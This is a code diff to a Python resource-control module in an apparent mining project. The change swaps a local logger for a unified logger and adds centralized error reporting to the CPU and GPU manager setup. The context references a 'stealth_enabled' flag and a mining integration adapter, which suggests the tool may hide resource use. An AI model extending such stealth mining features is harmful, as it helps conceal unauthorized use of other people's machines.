@@ -26,39 +26,17 @@ import signal
 import resource
 from pathlib import Path
 
-# ✅ ENHANCED: Dedicated logger cho resource control với detailed operations tracking
-def setup_resource_control_logger():
-    """Setup dedicated logger cho resource control operations"""
-    logger = logging.getLogger('resource_control')
-    if not logger.handlers:  # Tránh duplicate handlers
-        logger.setLevel(logging.INFO)
-        
-        # ✅ CENTRALIZED: Tạo log file trong centralized directory chính
-        log_dir = Path('/app/mining_environment/logs')
-        log_dir.mkdir(parents=True, exist_ok=True)
-        log_file = log_dir / 'resource_control.log'
-        
-        # File handler với detailed format
-        file_handler = logging.FileHandler(log_file)
-        file_handler.setLevel(logging.INFO)
-        
-        # Formatter với timestamp và resource info
-        formatter = logging.Formatter(
-            '%(asctime)s - %(name)s - %(levelname)s - [%(funcName)s:%(lineno)d] - %(message)s'
-        )
-        file_handler.setFormatter(formatter)
-        logger.addHandler(file_handler)
-        
-        # Console handler cho debug
-        console_handler = logging.StreamHandler()
-        console_handler.setLevel(logging.WARNING)
-        console_handler.setFormatter(formatter)
-        logger.addHandler(console_handler)
-    
-    return logger
+# ✅ UNIFIED LOGGING: Use centralized logging system
+from .unified_logging import get_unified_logger
 
-# Initialize resource control logger
-resource_logger = setup_resource_control_logger()
+# ✅ ERROR MANAGEMENT: Use centralized error handling system
+from .error_management import get_error_reporter, ErrorCode, ErrorSeverity, report_error
+
+# ✅ STANDARDIZED: Get unified logger instance
+resource_logger = get_unified_logger('resource_control')
+
+# ✅ ERROR REPORTER: Get centralized error reporter instance
+error_reporter = get_error_reporter()
 from mining_environment.cpu_plugins import discover_cpu_plugins, ICpuTechnique  # Sprint 1 plugin framework
 from threading import RLock
 from mining_environment.cpu_plugins.core.config import load_plugin_cfg, CpuPluginFile
@@ -167,6 +145,16 @@ class CPUResourceManager(metaclass=_SingletonMeta):
             self.stealth_enabled = True
             
         except Exception as e:
+            # ✅ ERROR REPORTING: CPU manager initialization failure
+            error_reporter.report_error(
+                ErrorCode.RESOURCE_MANAGER_INIT_FAILED,
+                f"Lỗi khi khởi tạo cpu manager: {e}",
+                ErrorSeverity.HIGH,
+                module='resource_control',
+                function='CPUResourceManager.__init__',
+                context_data={'error': str(e), 'stealth_enabled': False},
+                exception=e
+            )
             self.logger.error(f"Lỗi khi khởi tạo cpu manager: {e}")
             self.stealth_enabled = False
             # Fallback initialization for basic functionality
@@ -189,6 +177,16 @@ class CPUResourceManager(metaclass=_SingletonMeta):
             self.throttler = MiningIntegrationAdapter(logger=self.logger)
             self.logger.info("🛡️ [CPU Manager] Throttling Manager initialized.")
         except Exception as e:
+            # ✅ ERROR REPORTING: Critical MiningIntegrationAdapter initialization failure
+            error_reporter.report_error(
+                ErrorCode.RESOURCE_MANAGER_INIT_FAILED,
+                f"Không thể khởi tạo MiningIntegrationAdapter: {e}",
+                ErrorSeverity.CRITICAL,
+                module='resource_control',
+                function='CPUResourceManager.__init__',
+                context_data={'component': 'MiningIntegrationAdapter', 'error': str(e)},
+                exception=e
+            )
             self.logger.critical(f"Không thể khởi tạo MiningIntegrationAdapter: {e}")
 
         # RDT CAT cache control (optional)
@@ -1356,6 +1354,16 @@ class GPUResourceManager:
             self.gpu_initialized = False
             return False
         except Exception as e:
+            # ✅ ERROR REPORTING: GPU initialization failure
+            error_reporter.report_error(
+                ErrorCode.RESOURCE_MANAGER_INIT_FAILED,
+                f"Lỗi khi khởi tạo pynvml: {e}",
+                ErrorSeverity.HIGH,
+                module='resource_control',
+                function='GPUResourceManager._initialize_nvml',
+                context_data={'component': 'pynvml', 'error': str(e)},
+                exception=e
+            )
             self.logger.error(f"Lỗi khi khởi tạo pynvml: {e}")
             self.gpu_initialized = False
             return False
